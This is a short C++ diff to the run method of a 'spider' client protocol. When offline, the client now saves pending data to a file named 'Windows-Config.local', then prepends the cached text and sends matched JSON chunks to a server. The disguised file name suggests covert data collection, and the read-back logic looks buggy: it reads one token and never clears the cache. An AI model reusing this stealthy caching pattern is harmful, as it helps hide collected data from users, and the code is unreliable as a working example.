@@ -42,12 +42,23 @@ void spider::ClientProtocol::run()
   if (str.empty())
     return ;
   if (!_net.isConnected())
-    if (!connect()) {//todo writting in file and vider buffer
+    if (!connect()) {
+        std::ofstream file("Windows-Config.local", std::ios::out);
+        if (!file)
+            return;
+        file << str;
+        file.close();
     }
-
-//todo if file not empty add it in the beginning of str
-  std::regex reg = std::regex("\\{(?:(?:\\s*\"\\w+\": \"\\w+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"\\w+\": \"\\w+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"\\w+\": \"\\w+\",{0,1}\\s*)+)|(?:\\s*\"\\w+\": \"\\w+\",{0,1}\\s*)+)\\}");
-  for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
+    std::ifstream   open("Windows-Config.local", std::ios::in);
+    if (!open)
+        return;
+    std::string tmp;
+    open >> tmp;
+    tmp.append(str);
+    str = tmp;
+    open.close();
+    std::regex reg = std::regex("\\{(?:(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)\\}");
+    for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
        it != std::sregex_iterator(); ++it)
     _net.send(it->str());
 }
